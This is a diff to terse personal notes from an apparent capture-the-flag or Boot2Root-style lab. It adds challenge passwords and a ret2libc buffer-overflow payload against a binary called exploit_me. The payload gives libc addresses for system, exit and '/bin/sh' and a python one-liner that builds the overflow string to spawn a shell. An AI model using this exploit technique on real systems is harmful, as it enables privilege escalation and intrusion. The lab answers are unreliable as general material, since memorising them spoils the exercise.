@@ -102,5 +102,37 @@ Publicspeakingisveryeasy.126241207202b7559opekmq426315
 Publicspeakingisveryeasy.126241207207b5249opekmq426315
 austinpowers
 
+
+
+thor
+
 New:
 Publicspeakingisveryeasy.126241207201b2149opekmq426135
+
+
+
+in zaz exploit_me
+
+system
+0xb7e6b060
+
+\x60\xb0\xe6\xb7
+
+
+exit
+0xb7e5ebe0
+
+\xe0\xeb\xe5\xb7
+
+libc
+0xb7e2c000
+
+/bin/sh
+0x160c58
+
+libc + /bin/sh
+0xB7F8CC58( 0xb7e2c000 + 0x160c58 )
+
+\x58\xcc\xf8\xb7
+
+python -c 'print("A" * 143 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7")'
